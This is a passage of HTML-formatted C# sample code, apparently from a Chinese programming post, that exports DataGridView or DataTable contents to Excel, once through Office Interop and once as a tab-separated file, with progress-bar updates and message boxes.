{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Visible = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Reflection.Missing miss = System.Reflection.Missing.Value;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft.Office.Interop.Excel.ApplicationClass excel = new Microsoft.Office.Interop.Excel.ApplicationClass();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Application.Workbooks.Add(true); ;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Visible = false;//若是true，则在导出的时候会显示EXcel界面。</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (excel == null)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;EXCEL无法启动！&quot;, &quot;错误&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft.Office.Interop.Excel.Workbooks books = (Microsoft.Office.Interop.Excel.Workbooks)excel.Workbooks;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft.Office.Interop.Excel.Workbook book = (Microsoft.Office.Interop.Excel.Workbook)(books.Add(miss));</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Microsoft.Office.Interop.Excel.Worksheet sheet = (Microsoft.Office.Interop.Excel.Worksheet)book.ActiveSheet;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sheet.Name = &quot;test&quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //生成字段名称</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; gridView.ColumnCount; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Cells[1, i + 1] = gridView.Columns[i].HeaderText.ToString();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //填充数据</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; gridView.RowCount - 1; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int j = 0; j &lt; gridView.ColumnCount; j++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (gridView[j, i].Value == typeof(string))</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Cells[i + 2, j + 1] = &quot;&quot; + gridView[i, j].Value.ToString();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Cells[i + 2, j + 1] = gridView[j, i].Value.ToString();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value += 100 / gridView.RowCount;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; sheet.SaveAs(strName, miss, miss, miss, miss, miss, Microsoft.Office.Interop.Excel.XlSaveAsAccessMode.xlNoChange, miss, miss, miss);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; book.Close(false, miss, miss);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; books.Close();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; excel.Quit();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Runtime.InteropServices.Marshal.ReleaseComObject(sheet);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Runtime.InteropServices.Marshal.ReleaseComObject(book);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Runtime.InteropServices.Marshal.ReleaseComObject(books);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Runtime.InteropServices.Marshal.ReleaseComObject(excel);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; GC.Collect();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;数据已经成功导出到：&quot; + saveFileDialog.FileName.ToString(), &quot;导出完成&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Visible = false;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //-------------------------------------------------------------------------------------------------------------------------------------</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //导出整个DataGridView中的数据到Excel中</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void ExportTOExcel2()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (gridView.Rows.Count == 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;没有数据可供导出！&quot;, &quot;提示&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.Filter = &quot;Execl files (*.xls)|*.xls&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.FilterIndex = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.RestoreDirectory = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //saveFileDialog2.CreatePrompt = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.Title = &quot;导出文件保存路径&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.FileName = null;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog2.ShowDialog();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string FileName =&nbsp; saveFileDialog2.FileName;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (FileName.Length != 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Visible = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; System.Data.DataTable dt = objSet.Tables[0];</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; FileStream objFileStream;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; StreamWriter objStreamWriter;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string strLine = &quot;&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objFileStream = new FileStream(FileName, FileMode.OpenOrCreate, FileAccess.Write);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objStreamWriter = new StreamWriter(objFileStream, System.Text.Encoding.Unicode);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value = 0;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; dt.Columns.Count; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strLine = strLine + dt.Columns[i].ColumnName.ToString() + Convert.ToChar(9);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objStreamWriter.WriteLine(strLine);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strLine = &quot;&quot;;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int i = 0; i &lt; dt.Rows.Count; i++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strLine = strLine + (i + 1) + Convert.ToChar(9);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for (int j = 1; j &lt; dt.Columns.Count; j++)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strLine = strLine + dt.Rows[i][j].ToString() + Convert.ToChar(9);</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objStreamWriter.WriteLine(strLine);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value += 100 / dt.Rows.Count;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; strLine = &quot;&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objStreamWriter.Close();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; objFileStream.Close();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;数据已经成功导出到：&quot; + saveFileDialog2.FileName.ToString(), &quot;导出完成&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Value = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; toolStripProgressBar1.Visible = 